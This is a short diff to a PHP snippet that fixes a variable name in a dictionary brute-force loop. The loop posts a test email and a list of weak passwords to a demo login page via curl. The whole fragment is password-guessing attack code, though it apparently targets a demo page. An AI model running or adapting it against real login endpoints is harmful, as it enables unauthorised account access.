@@ -15,7 +15,7 @@ PHP:
 $dic = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo'];
 foreach ($dic as $password) {
     $email = 'test@demo.brute';
-    url = 'http://tqk.itps.com.vn/demo.php';
+    $url = 'http://tqk.itps.com.vn/demo.php';
     $data_string = 'email=' .urldecode($email). '&password=' .urlencode($password);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
